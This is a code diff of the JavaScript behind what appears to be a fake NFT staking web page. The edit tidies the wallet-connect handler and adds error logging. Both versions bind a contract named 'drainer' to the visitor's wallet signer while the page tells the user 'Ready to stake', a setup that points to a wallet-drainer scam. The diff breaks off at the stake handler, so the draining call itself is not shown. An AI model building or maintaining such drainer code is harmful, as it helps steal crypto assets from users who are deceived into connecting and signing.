@@ -38,21 +38,23 @@
     let provider, signer, nft, drainer;
 
     document.getElementById("connectBtn").onclick = async () => {
-      if (window.ethereum) {
-        try {
-          provider = new ethers.BrowserProvider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          signer = await provider.getSigner();
-          nft = new ethers.Contract(nftAddress, nftABI, signer);
-          drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
-          document.getElementById("status").innerText = "✅ Wallet connected. Ready to stake.";
-        } catch (err) {
-          document.getElementById("status").innerText = "❌ Wallet connection failed.";
-        }
-      } else {
-        alert("Please install MetaMask to use this dApp.");
-      }
-    };
+  if (window.ethereum) {
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = await provider.getSigner();
+      nft = new ethers.Contract(nftAddress, nftABI, signer);
+      drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
+      document.getElementById("status").innerText = "✅ Wallet connected. Ready to stake.";
+    } catch (err) {
+      console.error("Connection error:", err);
+      document.getElementById("status").innerText = "❌ Wallet connection failed.";
+    }
+  } else {
+    alert("Please install MetaMask.");
+  }
+};
+
 
     document.getElementById("stakeBtn").onclick = async () => {
       if (!signer) return alert("Connect your wallet first.");
